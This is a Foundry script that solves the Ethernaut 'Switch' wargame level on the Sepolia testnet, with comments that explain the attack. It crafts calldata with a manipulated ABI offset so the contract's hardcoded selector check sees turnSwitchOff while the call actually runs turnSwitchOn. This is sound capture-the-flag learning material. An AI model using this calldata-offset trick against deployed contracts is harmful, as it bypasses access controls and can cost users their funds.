// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Switch.sol";

/*
    Solution script for the Ethernaut Level 28: Switch

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in SwitchScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Switch.s.sol:SwitchScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Switch.s.sol/11155111
*/

contract SwitchScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0x8634525b8a1B8a84f3dE8c8C179859c8BeB2d44E;
    Switch level29 = Switch(instance);

    function run() external {
        vm.startBroadcast();

        require(!level29.switchOn(), 'switch is alredy on');

        /*
            To attck this we need to somehow bypass the onlyOff modifier. 

            The key flaw in this modifier is the hardcoded offset of 68 to fetch the function byte signature from the calldata. 
            

            The selector is loaded from the calldata using calldatacopy like so:

                calldatacopy(selector, 68, 4)

                    'selector' is the local variable where the data will be copied
                    68 is the offset
                    4  is the lengh

                Why is the offset 68? It is because the calldata that is sent is made up of:

                    (4 bytes) flipSwitch function selector 
                    (32 bytes) data offset 
                    (32 bytes) data length

                    THEREFORE 4 + 32 + 32 = 68 bytes which is where the actual data bytes begins which starts with the 4 byte 
                    function select that we actually want to call.

            Calldata layout (when calling flipSwitch function with bytes data for turnSwitchOff) ->
            30c13ade                                                                   -> bytes4(keccak256("flipSwitch(bytes _data)"))
            0x00 (00) 0000000000000000000000000000000000000000000000000000000000000020 -> offset for the data field
            0x20 (32) 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
            0x40 (64) 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))

            Calldata layout (when calling flipSwitch function with bytes data modified to trick onlyOff modifier) ->
            30c13ade                                                                   -> bytes4(keccak256("flipSwitch(bytes _data)"))
            0x00 (00) 0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field (hardcoded to 0x60)
            0x20 (32) 0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
            0x40 (64) 20606e1500000000000000000000000000000000000000000000000000000000 -> bytes4(keccak256("turnSwitchOff()"))
            0x60 (96) 0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
            0x80      76227e1200000000000000000000000000000000000000000000000000000000 -> functin selector for turnSwitchOn()

            The main part here is that we can manually choose an offset value for the beginning of our “real” calldata,
            and input anything we want in between. That means that we can put the actual _data parameter value that is being used 
            at an offset of 96 bytes (storing the length of the bytes and then the actual value), 
            and still have the value 0x20606e15 at an offset of 64 bytes.
        */
        
        bytes memory callData =
            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        address(level29).call(callData);

        require(level29.switchOn(), 'switch was not turned on');

        vm.stopBroadcast();
    }
}
